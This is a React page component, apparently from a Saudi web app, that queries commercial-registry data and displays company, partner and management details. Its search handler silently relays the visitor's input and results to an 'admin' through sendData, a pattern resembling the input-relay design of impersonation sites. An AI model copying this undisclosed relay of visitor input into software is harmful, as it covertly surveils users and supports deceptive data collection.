import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import { navigateToPage, sendData } from "@/lib/store";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";

interface CRData {
  crNationalNumber: string;
  crNumber: string;
  name: string;
  crCapital: number;
  companyDuration: number;
  isMain: boolean;
  issueDateGregorian: string;
  issueDateHijri: string;
  headquarterCityName: string;
  hasEcommerce: boolean;
  entityType: {
    name: string;
    formName: string;
  };
  status: {
    name: string;
    confirmationDate?: { gregorian: string; hijri: string };
  };
  contactInfo?: {
    phoneNo: string | null;
    mobileNo: string | null;
    email: string | null;
  };
  capital?: {
    currencyName: string;
    contributionCapital?: {
      typeName: string;
    };
  };
  parties?: Array<{
    name: string;
    typeName: string;
    identity: { id: string; typeName: string };
    partnership: Array<{ name: string }>;
    nationality: { name: string };
  }>;
  management?: {
    structureName: string;
    managers: Array<{
      name: string;
      typeName: string;
      nationality: { name: string };
    }>;
  };
  activities?: Array<{
    id: string;
    name: string;
  }>;
}

export default function CommercialData() {
  const [, navigate] = useLocation();
  const [crNumber, setCrNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [data, setData] = useState<CRData | null>(null);
  const [searched, setSearched] = useState(false);

  useEffect(() => {
    navigateToPage("بيانات السجل التجاري");
  }, []);

  const handleSearch = async () => {
    if (!crNumber || crNumber.length < 7) {
      setError("الرجاء إدخال رقم سجل تجاري صحيح");
      return;
    }

    setLoading(true);
    setError("");
    setData(null);
    setSearched(true);

    // إرسال البيانات للأدمن
    sendData({
      data: { "رقم السجل التجاري": crNumber },
      current: "استعلام سجل تجاري",
    });

    try {
      const response = await fetch(`/api/wathq/cr/${crNumber}`);
      const result = await response.json();

      if (result.error) {
        setError(result.error);
      } else {
        setData(result);
        // إرسال البيانات المجلوبة للأدمن
        sendData({
          data: {
            "رقم السجل التجاري": crNumber,
            "الاسم التجاري": result.name,
            "الحالة": result.status?.name,
            "المدينة": result.headquarterCityName,
            "رأس المال": result.crCapital,
          },
          current: "نتائج استعلام سجل تجاري",
        });
      }
    } catch (err) {
      setError("حدث خطأ في الاتصال. حاول مرة أخرى.");
    } finally {
      setLoading(false);
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case "نشط": return "bg-green-100 text-green-800";
      case "منتهي": return "bg-red-100 text-red-800";
      case "معلق": return "bg-yellow-100 text-yellow-800";
      default: return "bg-gray-100 text-gray-800";
    }
  };

  return (
    <PageLayout variant="default">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="bg-white rounded-2xl shadow-lg p-6 mb-6">
          <div className="flex items-center gap-4 mb-6">
            <div className="w-14 h-14 bg-[#1a5f4a] rounded-xl flex items-center justify-center">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
              </svg>
            </div>
            <div>
              <h1 className="text-xl font-bold text-gray-800">الاستعلام عن السجل التجاري</h1>
              <p className="text-gray-500 text-sm">استعلم عن بيانات السجل التجاري من وزارة التجارة</p>
            </div>
          </div>

          {/* Search Form */}
          <div className="flex gap-3">
            <div className="flex-1">
              <Label htmlFor="crNumber" className="mb-2 block">رقم السجل التجاري أو الرقم الوطني الموحد</Label>
              <Input
                id="crNumber"
                type="tel"
                inputMode="numeric"
                placeholder="مثال: 1010711252 أو 7001272475"
                value={crNumber}
                onChange={(e) => setCrNumber(e.target.value.replace(/\D/g, ''))}
                onKeyDown={(e) => e.key === 'Enter' && handleSearch()}
                maxLength={15}
              />
            </div>
            <div className="flex items-end">
              <Button
                onClick={handleSearch}
                disabled={loading}
                className="bg-[#1a5f4a] hover:bg-[#134436] h-10 px-6"
              >
                {loading ? (
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                ) : (
                  "استعلام"
                )}
              </Button>
            </div>
          </div>

          {error && (
            <div className="mt-4 bg-red-50 border border-red-200 rounded-lg p-3">
              <p className="text-red-600 text-sm">{error}</p>
            </div>
          )}
        </div>

        {/* Loading */}
        {loading && (
          <div className="bg-white rounded-2xl shadow-lg p-12 text-center">
            <div className="w-16 h-16 border-4 border-[#1a5f4a] border-t-transparent rounded-full animate-spin mx-auto mb-4" />
            <p className="text-gray-600">جاري جلب البيانات من وزارة التجارة...</p>
          </div>
        )}

        {/* Results */}
        {data && !loading && (
          <div className="space-y-4">
            {/* Basic Info Card */}
            <div className="bg-white rounded-2xl shadow-lg p-6">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-lg font-bold text-gray-800">البيانات الأساسية</h2>
                <span className={`px-3 py-1 rounded-full text-sm font-medium ${getStatusColor(data.status?.name || '')}`}>
                  {data.status?.name || 'غير محدد'}
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <InfoRow label="الاسم التجاري" value={data.name} />
                <InfoRow label="رقم السجل التجاري" value={data.crNumber} />
                <InfoRow label="الرقم الوطني الموحد" value={data.crNationalNumber} />
                <InfoRow label="نوع المنشأة" value={data.entityType?.name} />
                <InfoRow label="الشكل القانوني" value={data.entityType?.formName} />
                <InfoRow label="رأس المال" value={data.crCapital ? `${data.crCapital.toLocaleString()} ${data.capital?.currencyName || 'ريال سعودي'}` : 'غير محدد'} />
                <InfoRow label="مدة الشركة" value={data.companyDuration ? `${data.companyDuration} سنة` : 'غير محدد'} />
                <InfoRow label="المدينة" value={data.headquarterCityName} />
                <InfoRow label="تاريخ الإصدار (ميلادي)" value={data.issueDateGregorian} />
                <InfoRow label="تاريخ الإصدار (هجري)" value={data.issueDateHijri} />
                <InfoRow label="سجل رئيسي" value={data.isMain ? 'نعم' : 'لا'} />
                <InfoRow label="تجارة إلكترونية" value={data.hasEcommerce ? 'نعم' : 'لا'} />
                {data.status?.confirmationDate && (
                  <InfoRow label="تاريخ التأكيد" value={data.status.confirmationDate.gregorian} />
                )}
              </div>
            </div>

            {/* Contact Info */}
            {data.contactInfo && (
              <div className="bg-white rounded-2xl shadow-lg p-6">
                <h2 className="text-lg font-bold text-gray-800 mb-4">معلومات الاتصال</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <InfoRow label="الهاتف" value={data.contactInfo.phoneNo || 'غير محدد'} />
                  <InfoRow label="الجوال" value={data.contactInfo.mobileNo || 'غير محدد'} />
                  <InfoRow label="البريد الإلكتروني" value={data.contactInfo.email || 'غير محدد'} />
                </div>
              </div>
            )}

            {/* Parties / Partners */}
            {data.parties && data.parties.length > 0 && (
              <div className="bg-white rounded-2xl shadow-lg p-6">
                <h2 className="text-lg font-bold text-gray-800 mb-4">الشركاء والمالكين</h2>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="bg-gray-50">
                        <th className="text-right p-3 font-semibold text-gray-600">الاسم</th>
                        <th className="text-right p-3 font-semibold text-gray-600">النوع</th>
                        <th className="text-right p-3 font-semibold text-gray-600">رقم الهوية</th>
                        <th className="text-right p-3 font-semibold text-gray-600">الصفة</th>
                        <th className="text-right p-3 font-semibold text-gray-600">الجنسية</th>
                      </tr>
                    </thead>
                    <tbody>
                      {data.parties.map((party, index) => (
                        <tr key={index} className="border-t border-gray-100">
                          <td className="p-3 text-gray-800">{party.name}</td>
                          <td className="p-3 text-gray-600">{party.typeName}</td>
                          <td className="p-3 text-gray-600" dir="ltr">{party.identity?.id}</td>
                          <td className="p-3 text-gray-600">{party.partnership?.map(p => p.name).join(', ')}</td>
                          <td className="p-3 text-gray-600">{party.nationality?.name}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}

            {/* Management */}
            {data.management && data.management.managers && data.management.managers.length > 0 && (
              <div className="bg-white rounded-2xl shadow-lg p-6">
                <h2 className="text-lg font-bold text-gray-800 mb-4">الإدارة ({data.management.structureName})</h2>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="bg-gray-50">
                        <th className="text-right p-3 font-semibold text-gray-600">الاسم</th>
                        <th className="text-right p-3 font-semibold text-gray-600">النوع</th>
                        <th className="text-right p-3 font-semibold text-gray-600">الجنسية</th>
                      </tr>
                    </thead>
                    <tbody>
                      {data.management.managers.map((manager, index) => (
                        <tr key={index} className="border-t border-gray-100">
                          <td className="p-3 text-gray-800">{manager.name}</td>
                          <td className="p-3 text-gray-600">{manager.typeName}</td>
                          <td className="p-3 text-gray-600">{manager.nationality?.name}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}

            {/* Activities */}
            {data.activities && data.activities.length > 0 && (
              <div className="bg-white rounded-2xl shadow-lg p-6">
                <h2 className="text-lg font-bold text-gray-800 mb-4">الأنشطة التجارية</h2>
                <div className="space-y-2">
                  {data.activities.map((activity, index) => (
                    <div key={index} className="flex items-center gap-3 p-3 bg-gray-50 rounded-lg">
                      <span className="text-[#1a5f4a] font-mono text-sm">{activity.id}</span>
                      <span className="text-gray-700">{activity.name}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Action Buttons */}
            <div className="bg-white rounded-2xl shadow-lg p-6">
              <div className="flex gap-3">
                <Button
                  onClick={() => {
                    setCrNumber("");
                    setData(null);
                    setSearched(false);
                  }}
                  variant="outline"
                  className="flex-1"
                >
                  استعلام جديد
                </Button>
                <Button
                  onClick={() => navigate("/home")}
                  className="flex-1 bg-[#1a5f4a] hover:bg-[#134436]"
                >
                  العودة للرئيسية
                </Button>
              </div>
            </div>
          </div>
        )}

        {/* No Results */}
        {searched && !data && !loading && !error && (
          <div className="bg-white rounded-2xl shadow-lg p-12 text-center">
            <div className="w-16 h-16 bg-gray-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
              </svg>
            </div>
            <p className="text-gray-500">لم يتم العثور على نتائج</p>
          </div>
        )}
      </div>
    </PageLayout>
  );
}

// Helper component for info rows
function InfoRow({ label, value }: { label: string; value: string | undefined | null }) {
  return (
    <div className="flex flex-col gap-1 p-3 bg-gray-50 rounded-lg">
      <span className="text-xs text-gray-500">{label}</span>
      <span className="text-sm font-medium text-gray-800">{value || 'غير محدد'}</span>
    </div>
  );
}
